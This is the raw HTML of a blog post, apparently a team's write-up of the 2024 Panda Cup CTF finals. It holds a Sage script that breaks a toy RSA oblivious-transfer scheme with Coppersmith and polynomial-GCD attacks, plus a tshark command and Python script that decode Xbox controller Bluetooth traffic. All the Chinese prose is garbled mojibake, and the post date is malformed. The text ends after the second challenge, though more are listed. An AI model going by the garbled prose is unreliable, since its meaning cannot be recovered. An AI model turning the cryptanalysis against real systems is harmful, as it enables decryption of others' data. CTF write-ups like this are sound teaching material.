<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2024 ç†ŠçŒ«æ¯å†³èµ› SU WriteUp -</title><meta name=description content="æœ¬æ¬¡ç†ŠçŒ«æ¯å†³èµ›æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 ç†ŠçŒ«æ¯å†³èµ›çš„ éƒ¨åˆ†writeupã€‚"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/pdctf-2024-su-wu\/","name":"2024 ç†ŠçŒ«æ¯å†³èµ› su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2024 ç†ŠçŒ«æ¯å†³èµ› SU WriteUp","description":"æœ¬æ¬¡ç†ŠçŒ«æ¯å†³èµ›æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚\nä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 ç†ŠçŒ«æ¯å†³èµ›çš„ éƒ¨åˆ†writeupã€‚\n","inLanguage":"en","wordCount":1060,"datePublished":"2024-06-23T21:13:11\u002b00:00","dateModified":"2024-06-23T21:13:11\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["XCTFfinals"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/pdctf-2024-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2024 ç†ŠçŒ«æ¯å†³èµ› SU WriteUp"><meta property="og:description" content="æœ¬æ¬¡ç†ŠçŒ«æ¯å†³èµ›æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 ç†ŠçŒ«æ¯å†³èµ›çš„ éƒ¨åˆ†writeupã€‚"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/pdctf-2024-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2024 ç†ŠçŒ«æ¯å†³èµ› SU WriteUp"><meta name=twitter:description content="æœ¬æ¬¡ç†ŠçŒ«æ¯å†³èµ›æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 ç†ŠçŒ«æ¯å†³èµ›çš„ éƒ¨åˆ†writeupã€‚"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2024 ç†ŠçŒ«æ¯å†³èµ› SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on June 23, 230611
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;5&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;1060&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#æ•°æ®å®‰å…¨>æ•°æ®å®‰å…¨</a><ul><li><a href=#otto>OTTO</a></li><li><a href=#bluetooth>Bluetooth</a></li><li><a href=#myerp>myerp</a></li><li><a href=#æ˜¯è°å·å·å·èµ°æˆ‘çš„å¿ƒ>æ˜¯è°å·å·å·èµ°æˆ‘çš„å¿ƒ</a></li></ul></li><li><a href=#å·¥æ§>å·¥æ§</a><ul><li><a href=#ics2>ICS2</a></li></ul></li><li><a href=#aiæ¼æ´æŒ–æ˜>AIæ¼æ´æŒ–æ˜</a><ul><li><a href=#panda>panda</a></li><li><a href=#login>login</a></li><li><a href=#safestring>safestring</a></li><li><a href=#gateway>gateway</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æœ¬æ¬¡ç†ŠçŒ«æ¯å†³èµ›æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œæ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_<a href=mailto:xctf@126.com>xctf@126.com</a> æˆ–è€…ç›´æ¥è”ç³»ä¹¦é±¼ QQ:381382770ã€‚</p><p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2024 ç†ŠçŒ«æ¯å†³èµ›çš„ éƒ¨åˆ†writeupã€‚</p><p><img src=/img/2024-06-23-PDCTF/1.png alt=img></p><h1 id=æ•°æ®å®‰å…¨>æ•°æ®å®‰å…¨</h1><h2 id=otto>OTTO</h2><p>å¥—äº†ä¸ªrsa-OTåè®®çš„å£³ï¼Œè€ƒçš„ä¸œè¥¿å¾ˆåŸºç¡€ã€‚å¯¹äºtransfer2ï¼Œv2å·²çŸ¥ï¼Œå»ºç«‹ä¸¤ä¸ªæ–¹ç¨‹åšGCDå³å¯ï¼›å¯¹äºtransfer1ï¼Œç”±äºv1æœªçŸ¥ä½†eå¾ˆå°ï¼Œå› æ­¤å¯ä»¥è€ƒè™‘æ¶ˆå»v1ä¹‹åcoppersmithæ‰“ï¼Œå»æ‰flagå¤´ç¥–ä¼ æ¿å­æ¢­å“ˆã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>prefix</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;flag{&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>PR</span><span class=o>.&lt;</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=o>&gt;</span> <span class=o>=</span> <span class=n>PolynomialRing</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>n1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=p>(</span><span class=n>m1</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>-</span> <span class=n>prefix</span><span class=o>*</span><span class=mi>256</span><span class=o>^</span><span class=mi>16</span> <span class=o>+</span> <span class=n>x</span><span class=p>)</span><span class=o>^</span><span class=n>e1</span> <span class=o>-</span> <span class=p>(</span><span class=n>m1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>-</span> <span class=n>y</span><span class=p>)</span><span class=o>^</span><span class=n>e1</span> <span class=o>-</span> <span class=n>x1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>x1</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>small_roots</span><span class=p>(</span><span class=n>f</span><span class=p>,</span><span class=n>bounds</span><span class=o>=</span><span class=p>(</span><span class=mi>256</span><span class=o>^</span><span class=mi>25</span><span class=p>,</span><span class=mi>256</span><span class=o>^</span><span class=mi>25</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>n1</span><span class=o>-</span><span class=n>res</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>])))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>###################################### part2</span>
</span></span><span class=line><span class=cl><span class=n>PR</span><span class=o>.&lt;</span><span class=n>x</span><span class=o>&gt;</span> <span class=o>=</span> <span class=n>PolynomialRing</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>n2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>f1</span> <span class=o>=</span> <span class=p>(</span><span class=n>m2</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>-</span> <span class=n>x</span><span class=p>)</span><span class=o>^</span><span class=n>e2</span> <span class=o>-</span> <span class=p>(</span><span class=n>v2</span> <span class=o>-</span> <span class=n>x2</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>f2</span> <span class=o>=</span> <span class=p>(</span><span class=n>m2</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>-</span> <span class=n>c</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>-</span> <span class=n>x</span><span class=o>*</span><span class=n>c</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span><span class=o>^</span><span class=n>e2</span> <span class=o>-</span> <span class=p>(</span><span class=n>v2</span> <span class=o>-</span> <span class=n>x2</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gcd</span><span class=p>(</span><span class=n>g1</span><span class=p>,</span> <span class=n>g2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>g2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>g1</span><span class=p>,</span> <span class=n>g2</span> <span class=o>=</span> <span class=n>g2</span><span class=p>,</span> <span class=n>g1</span> <span class=o>%</span> <span class=n>g2</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>g1</span><span class=o>.</span><span class=n>monic</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=o>-</span><span class=n>gcd</span><span class=p>(</span><span class=n>f1</span><span class=p>,</span> <span class=n>f2</span><span class=p>)[</span><span class=mi>0</span><span class=p>])))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=bluetooth>Bluetooth</h2><p>æ‰“å¼€çœ‹åˆ°æŠ¥é”™ï¼Œä¸¢åˆ°010åˆ†æçœ‹åˆ°åé¢æœ‰ä¸€ä¸ªå‹ç¼©åŒ…</p><p><img src=/img/2024-06-23-PDCTF/1719148195050-58.png alt=img></p><p>ç„¶ååˆ†ææµé‡æ˜¯ä¸€ä¸ªxboxæ‰‹æŸ„çš„</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=err>https://www.partsnotincluded.com/understanding-the-xbox-360-wired-controllers-usb-data/
</span></span></span></code></pre></td></tr></table></div></div><p>äºæ˜¯æå–æ‰€æœ‰çš„æ•°æ®å‡ºæ¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Shell data-lang=Shell><span class=line><span class=cl>tshark.exe -r .<span class=se>\x</span>box.pcapng -e <span class=s2>&#34;btl2cap.payload&#34;</span> -T fields
</span></span></code></pre></td></tr></table></div></div><p>å‘ç°å‰é¢çš„éƒ½ä¸€æ ·ï¼Œåªæœ‰åé¢çš„è¿™ä¸ªä½ç½®ä¸ä¸€æ ·</p><p><img src=/img/2024-06-23-PDCTF/1719148195050-59.png alt=img></p><p>è„šæœ¬æå–è¿‡ç¨‹ä¸­å‘ç°ï¼Œ31ä½å’Œ29ä½å­—ç¬¦é›†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Shell data-lang=Shell><span class=line><span class=cl>31ï¼š01248
</span></span><span class=line><span class=cl>29ï¼š0135
</span></span></code></pre></td></tr></table></div></div><p>æ’æŸ¥ä¸€æ¬¡è¯·æ±‚è·Ÿå“åº”ä¼šæœ‰é‡å¤çš„è¯·æ±‚ä¹‹åå°±æ˜¯å¦‚ä¸‹è„šæœ¬</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># coding:utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span><span class=o>,</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span><span class=o>,</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># os.popen(&#39;tshark -r xbox.pcapng -e btl2cap.payload -T fields  &gt; xbox.txt&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1># print(&#34;*********************æµé‡åŒ…æå–img*********************&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1># time.sleep(5)</span>
</span></span><span class=line><span class=cl><span class=c1># print(&#34;æµé‡åŒ…æå–æˆåŠŸ&#34;)</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;xbox.txt&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>files</span><span class=o>=</span><span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>a</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>num</span><span class=o>=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>file</span> <span class=ow>in</span> <span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;a1010b813c849f77a98c&#34;</span> <span class=ow>in</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>file</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>num</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(file.split(&#34;a1010b813c849f77a98c000000000&#34;)[1])</span>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>a</span><span class=p>),</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;a1010b813c849f77a98c000000000&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>key</span><span class=o>==</span><span class=s2>&#34;1&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span><span class=o>+=</span><span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>key</span><span class=o>==</span><span class=s2>&#34;3&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span><span class=o>+=</span><span class=s2>&#34;3&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>key</span><span class=o>==</span><span class=s2>&#34;5&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span><span class=o>+=</span><span class=s2>&#34;5&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>,</span><span class=s2>&#34;.&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>,</span><span class=s2>&#34;-&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;5&#34;</span><span class=p>,</span><span class=s2>&#34; &#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>flag1</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>a</span><span class=p>),</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;5&#34;</span> <span class=o>==</span> <span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>29</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag1</span><span class=o>+=</span><span class=s2>&#34;0&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;0&#34;</span> <span class=o>!=</span> <span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>31</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag1</span><span class=o>+=</span> <span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>31</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag1</span><span class=p>)</span>
